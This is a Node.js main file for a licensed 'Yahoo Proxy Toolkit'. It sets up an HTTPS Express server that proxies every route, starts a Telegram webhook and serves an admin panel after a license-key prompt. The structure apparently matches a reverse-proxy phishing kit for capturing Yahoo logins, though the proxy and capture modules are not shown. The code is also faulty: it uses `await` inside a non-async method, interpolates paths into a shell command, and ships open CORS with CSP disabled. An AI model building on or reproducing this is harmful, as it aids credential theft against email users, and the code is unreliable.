import express from 'express';
import https from 'https';
import fs from 'fs';
import path from 'path';
import readline from 'readline';
import helmet from 'helmet';
import cors from 'cors';
import compression from 'compression';
import bodyParser from 'body-parser';

// Import core utilities and modules
import { Config } from './utils/config-manager.js';
import Logger from './utils/logger.js';
import LicenseManager from './utils/license-manager.js';
import ProxyHandler from './core/proxy-handler.js';
import TelegramWebhook from './modules/telegram-webhook.js';
import NetworkUtils from './utils/network-utils.js';
import ErrorHandler from './middleware/error-handler.js';
import AdminRoutes from './routes/admin-routes.js';

class ProxyApplication {
    constructor() {
        // Core application components
        this.app = express();
        this.config = new Config();
        this.logger = new Logger();
        this.networkUtils = new NetworkUtils();
        this.errorHandler = new ErrorHandler();
        
        // Proxy and communication modules
        this.proxyHandler = new ProxyHandler();
        this.telegramWebhook = new TelegramWebhook();
        this.licenseManager = new LicenseManager();
    }

    // Configure application middleware
    configureMiddleware() {
        // Body parsing middleware
        this.app.use(bodyParser.json());
        this.app.use(bodyParser.urlencoded({ extended: true }));

        // Helmet for securing Express apps
        this.app.use(helmet({
            contentSecurityPolicy: false,
            referrerPolicy: { policy: 'no-referrer' }
        }));

        // CORS configuration
        this.app.use(cors({
            origin: this.config.get('security.allowed_origins', '*'),
            methods: ['GET', 'POST', 'PUT', 'DELETE'],
            allowedHeaders: ['Content-Type', 'Authorization']
        }));

        // Compression middleware
        this.app.use(compression());

        // Rate limiting middleware
        this.app.use((req, res, next) => {
            if (!this.networkUtils.checkRateLimit(req.ip)) {
                return res.status(429).json({ error: 'Too Many Requests' });
            }
            next();
        });
    }

    // Set up application routes
    setupRoutes() {
        // Serve static admin dashboard
        const adminPath = path.join(process.cwd(), 'src', 'public', 'admin');
        this.app.use('/admin', express.static(adminPath));

        // Admin API routes
        this.app.use('/admin/api', AdminRoutes.initRoutes());

        // Logging middleware
        this.app.use((req, res, next) => {
            this.logger.info(`[${req.method}] ${req.url} from ${req.ip}`);
            next();
        });

        // Proxy all routes
        this.app.use('*', this.proxyHandler.handleRequest.bind(this.proxyHandler));

        // 404 handler
        this.app.use(this.errorHandler.handle404);

        // Global error handler
        this.app.use(this.errorHandler.handleError);
    }

    // Generate SSL certificates if not exists
    ensureSSLCertificates() {
        const sslDir = path.join(process.cwd(), 'ssl');
        const keyPath = path.join(sslDir, 'key.pem');
        const certPath = path.join(sslDir, 'cert.pem');

        // Create SSL directory if not exists
        if (!fs.existsSync(sslDir)) {
            fs.mkdirSync(sslDir, { recursive: true });
        }

        // Generate self-signed certificates if not exists
        if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
            this.logger.warn('Generating self-signed SSL certificates');
            try {
                const { execSync } = await import('child_process');
                execSync(`
                    openssl req -x509 -newkey rsa:4096 \
                    -keyout ${keyPath} \
                    -out ${certPath} \
                    -days 365 -nodes \
                    -subj "/CN=localhost"
                `);
            } catch (error) {
                this.logger.error('SSL certificate generation failed', { error: error.message });
            }
        }

        return {
            key: fs.readFileSync(keyPath),
            cert: fs.readFileSync(certPath)
        };
    }

    // Start HTTPS server
    async startServer() {
        const port = this.config.get('proxy.listening_port', 8080);

        // Configure middleware
        this.configureMiddleware();

        // Set up routes
        this.setupRoutes();

        // Get SSL certificates
        const serverOptions = this.ensureSSLCertificates();

        // Create HTTPS server
        const server = https.createServer(serverOptions, this.app);
        
        // Start server
        return new Promise((resolve, reject) => {
            server.listen(port, () => {
                this.logger.info(`Proxy server started on port ${port}`);
                
                // Start Telegram webhook
                this.telegramWebhook.start()
                    .then(() => resolve(server))
                    .catch(reject);
            });

            // Handle server errors
            server.on('error', reject);
        });
    }

    // License validation method
    async validateLicense() {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        return new Promise((resolve, reject) => {
            console.log('===================================');
            console.log('🔒 Yahoo Proxy Toolkit - License Validation');
            console.log('===================================');
            console.log('This is a research-grade toolkit.');
            console.log('Unauthorized use is strictly prohibited.');
            console.log('===================================');

            const askForLicense = () => {
                rl.question('Enter your license key: ', async (licenseKey) => {
                    try {
                        // Validate license key
                        const isValid = await this.licenseManager.validateLicenseKey(licenseKey);

                        if (isValid) {
                            console.log('✅ License validated successfully!');
                            rl.close();
                            resolve(licenseKey);
                        } else {
                            console.log('❌ Invalid license key. Please try again.');
                            askForLicense();
                        }
                    } catch (error) {
                        console.error('License validation error:', error.message);
                        askForLicense();
                    }
                });
            };

            askForLicense();
        });
    }

    // Main application run method
    async run() {
        try {
            // Validate license before starting
            await this.validateLicense();

            // Start the server
            await this.startServer();
        } catch (error) {
            this.logger.error('Application startup failed', { 
                error: error.message,
                stack: error.stack 
            });
            process.exit(1);
        }
    }

    // Static method to run the application
    static async main() {
        try {
            const proxyApp = new ProxyApplication();
            await proxyApp.run();
        } catch (error) {
            console.error('Unhandled application error:', error);
            process.exit(1);
        }
    }
}

// Application entry point
ProxyApplication.main();

export default ProxyApplication;